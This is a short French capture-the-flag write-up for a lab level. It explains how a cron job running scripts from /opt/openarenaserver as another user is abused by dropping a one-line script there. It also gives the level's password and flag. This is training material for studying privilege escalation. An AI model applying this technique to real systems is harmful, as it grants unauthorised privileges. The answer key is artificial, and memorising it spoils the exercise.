# level 05

### ![#409EFF](https://via.placeholder.com/15/409EFF/000000?text=+) `‎‎‎‎‎‎‎‏‏‎ Password`
```
ne2searoevaevoem4ov4ar8ap
```

### ![#E6A23C](https://via.placeholder.com/15/E6A23C/000000?text=+) `‎‎‎‎‎‎‎‏‏‎ ‎‏‏‎Exploit`

En arrivant on recoit
```
You have new mail in /var/mail/level05
```
Le fichier ressemble à
```sh
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

On remarque que c’est un cron qui exécute openarenaserver  toutes les 2mins.

Le fichier exécute toutes les commandes qui se trouvent dans `opt/openarenaserver` puis le supprime juste après.

L’idée est de créer un fichier qui lance getflag et écris le résultat dans un fichier dans le `/tmp`.

```sh
echo 'getflag > /tmp/wow' > /opt/openarenaserver/wow.sh && sleep 120 && cat /tmp/wow
```
(exemple ici qui créer le fichier, attend 120s puis cat le résultat)


```cmd
su level06
```

### ![#67C23A](https://via.placeholder.com/15/67C23A/000000?text=+) `‎‎‎‎‎‎‎‏‏‎ Flag`
```
viuaaale9huek52boumoomioc
```